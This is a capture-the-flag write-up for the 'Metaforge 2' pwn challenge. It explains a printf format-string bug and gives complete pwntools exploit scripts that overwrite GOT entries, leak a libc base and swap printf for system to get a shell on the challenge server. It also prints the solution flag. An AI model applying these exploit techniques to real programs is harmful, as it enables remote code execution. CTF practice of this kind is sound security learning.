# Metaforge 2

nc 0.cloud.chals.io 30732

`Same challenge but pop a shell`

## Challenge

I'm not going to re-iterate everything that was discovered in the Metaforge 1 writeup, but the important thing to remember is that we can control where `exit` goes.

Here's a refresh on the code.
```c
void main(void)

{
  char *local_78;
  size_t local_70;
  char local_68 [96];
  
  local_70 = 0x60;
  memset(local_68,0,0x60);
  local_78 = local_68;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("This challenge seems easy enough");
  getline(&local_78,&local_70,stdin);
  printf(local_68);
                    /* WARNING: Subroutine does not return */
  _exit(0);
}

void win(void)

{
  int __in_fd;
  
  __in_fd = open("./flag.txt",0,0);
  sendfile(1,__in_fd,(off_t *)0x0,0x60);
  return;
}
```

Previously we overwrote the `exit@got.plt` entry to return to win.

```python
from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('0.cloud.chals.io', 30732)

#Offset to write address at
offset = 8
#Where we want to write to (exit@got.plt)
target = 0x404000
#What we want to write it to (win function)
win = 0x0000000000401196

payload = fmtstr_payload(offset, {target : win})
p.sendline(payload)
p.interactive()
```

But in order to get the next flag we need to pop a shell on the system.

Heres a list of things we need to achieve in order to do this:
- Re-iterate our printf vulnerability
- Obtain libc base
- Change printf to system

So first off, we can grab the libc and linker from the dockerfile that was given with the challenge.

To get an arbitrary number of printf vuln's, we can rewrite the `exit@got.plt` entry to just return to main. That way after every execution of main it just returns back to main in an infinite loop.

After than we can use the stack leaks with `%p` in order to get our libc base. With some play testing I was able to see that offset 37 had a memory address located in the libc range. With that I was able to calculate the libc base.

After that, we can simply just overwrite the got entry for printf to system.

Heres that in code:

```python
from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('0.cloud.chals.io', 30732)

#Setting our libc (note that patchelf was used to utilize libc and linker from docker)
libc = elf.libc

#Offset
offset = 8
#Memory to write to
ret_address = 0x404000
#What to write
desire = 0x4011db

#Looping back to main by writing mains address to exit@got.plt
payload = fmtstr_payload(offset, {ret_address : desire})
p.sendlineafter(b'This challenge seems easy enough', payload)

#Leaking libc address and calculating base
payload = b'%37$p'
p.sendlineafter(b'This challenge seems easy enough', payload)
p.recvline() # junk
leak = int((p.recvuntil(b'\n')[:-1]), 16)
libc.address = leak - 0x276ca
log.info(hex(libc.address))

#We really only need to overwrite the last two bytes of the libc address because its already a libc address with a different offset
payload = fmtstr_payload(offset, {0x404010 : p64(libc.sym['system'])[:2]})
p.sendlineafter(b'This challenge seems easy enough', payload)
p.interactive()
```

## Flag

`SIVUSCG{NOW_THIS_IS_WHAT_WE_CALL_ROP_24}`